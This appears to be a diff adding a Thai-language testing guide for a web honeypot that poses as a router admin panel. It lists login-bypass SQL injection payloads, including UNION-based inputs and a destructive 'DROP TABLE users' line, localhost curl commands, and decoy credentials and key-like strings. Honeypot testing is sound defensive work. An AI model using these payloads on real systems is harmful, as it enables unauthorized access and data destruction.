@@ -1,0 +1,173 @@
+================================================================================
+                    WEB HONEYPOT - SQL INJECTION TESTING GUIDE
+================================================================================
+
+วิธีการใช้งาน Web Honeypot
+--------------------------
+
+1. รันโปรเจค:
+   python main.py
+
+2. เปิด browser ไปที่:
+   http://localhost:8080/login
+
+3. หน้า login จะแสดงเป็น Router Admin Panel ปลอม
+
+================================================================================
+                         ตัวอย่าง SQL INJECTION PAYLOADS
+================================================================================
+
+[Basic Authentication Bypass]
+-----------------------------
+Username: admin' OR '1'='1
+Password: anything
+
+Username: admin'--
+Password: anything
+
+Username: ' OR 1=1--
+Password: anything
+
+Username: admin' OR '1'='1'--
+Password: anything
+
+Username: ' OR ''='
+Password: ' OR ''='
+
+
+[Using Comments]
+----------------
+Username: admin'/*
+Password: */OR '1'='1
+
+Username: admin'#
+Password: anything
+
+Username: admin'-- -
+Password: anything
+
+
+[UNION Based]
+-------------
+Username: ' UNION SELECT 1,2,3--
+Password: anything
+
+Username: ' UNION ALL SELECT 'admin','password'--
+Password: anything
+
+Username: admin' UNION SELECT NULL,NULL,NULL--
+Password: anything
+
+
+[Tautology Based]
+-----------------
+Username: ' OR 1=1#
+Password: anything
+
+Username: ' OR 'x'='x
+Password: anything
+
+Username: ' OR 1=1 LIMIT 1--
+Password: anything
+
+Username: admin' OR 1=1 ORDER BY 1--
+Password: anything
+
+
+[String Concatenation]
+----------------------
+Username: admin'||'
+Password: anything
+
+Username: ' OR 'a'='a
+Password: anything
+
+
+[Advanced Payloads]
+-------------------
+Username: '; DROP TABLE users--
+Password: anything
+
+Username: ' OR EXISTS(SELECT * FROM users)--
+Password: anything
+
+Username: ' HAVING 1=1--
+Password: anything
+
+Username: ' GROUP BY columnname HAVING 1=1--
+Password: anything
+
+
+================================================================================
+                              หลังจาก LOGIN สำเร็จ
+================================================================================
+
+เมื่อ SQL Injection สำเร็จ จะเข้าถึงหน้าต่างๆ ได้:
+
+1. /dashboard  - แสดงสถานะระบบและอุปกรณ์ที่เชื่อมต่อ
+2. /users      - แสดงรายชื่อผู้ใช้พร้อม password hash
+3. /network    - แสดงอุปกรณ์ในเครือข่ายพร้อม IP/MAC
+4. /settings   - แสดง credentials ต่างๆ (MySQL, FTP, SSH, API keys)
+5. /logs       - แสดง system logs และ security events
+6. /backup     - แสดง backup files และ cloud credentials
+
+================================================================================
+                         ข้อมูลล่อที่จะพบในระบบ
+================================================================================
+
+[หน้า Users - Password Hashes]
+------------------------------
+admin    : $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJq...
+operator : $2b$12$XYZ789abcDEFghiJKLmnoPQRstu...
+guest    : $2b$12$ABC123defGHIjklMNOpqrSTUvwx...
+
+[หน้า Settings - Saved Credentials]
+------------------------------------
+MySQL     : root / Mysql_R00t_2024!     @ 192.168.1.30
+FTP       : ftpadmin / Ftp@dmin123      @ 192.168.1.10
+SSH       : sysadmin / Sys@dmin_SSH!    @ 192.168.1.1
+API       : apiuser / API_Secret_K3y!   @ api.internal
+AWS       : aws-admin / AWS_Acc3ss#2024 @ s3.amazonaws.com
+
+[หน้า Settings - WiFi Passwords]
+---------------------------------
+2.4GHz : WiFi_P@ssw0rd_2024
+5GHz   : WiFi_5G_Secure#2024
+
+[หน้า Settings - API Keys]
+---------------------------
+DDNS API Key    : sk_live_4eC39HqLyjWDarjtT1zdp7dc
+Cloud Token     : ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+VPN Secret      : vpn_secret_K9x2mP4qR7tY1wZ3
+SNMP Community  : public
+
+[หน้า Backup - Cloud Credentials]
+----------------------------------
+Cloud Backup : admin@company.com / CloudB@ckup2024!
+FTP Backup   : ftpbackup / Ftp_B@ckup_2024
+
+================================================================================
+                              หมายเหตุ
+================================================================================
+
+- ทุก credentials ที่แสดงเป็นข้อมูลปลอมเพื่อล่อ hacker
+- ระบบจะ log ทุก SQL injection attempt พร้อม IP address
+- ข้อมูลที่ hacker พยายามขโมยจะถูกบันทึกไว้ใน honeypot logs
+- ใช้สำหรับการศึกษาและทดสอบระบบความปลอดภัยเท่านั้น
+
+================================================================================
+                         TESTING WITH CURL
+================================================================================
+
+# ทดสอบ SQL Injection ผ่าน command line:
+
+curl -X POST http://localhost:8080/login \
+  -d "username=admin' OR '1'='1&password=test"
+
+curl -X POST http://localhost:8080/login \
+  -d "username=' UNION SELECT 1,2--&password=x"
+
+curl -X POST http://localhost:8080/login \
+  -d "username=admin'--&password=anything"
+
+================================================================================
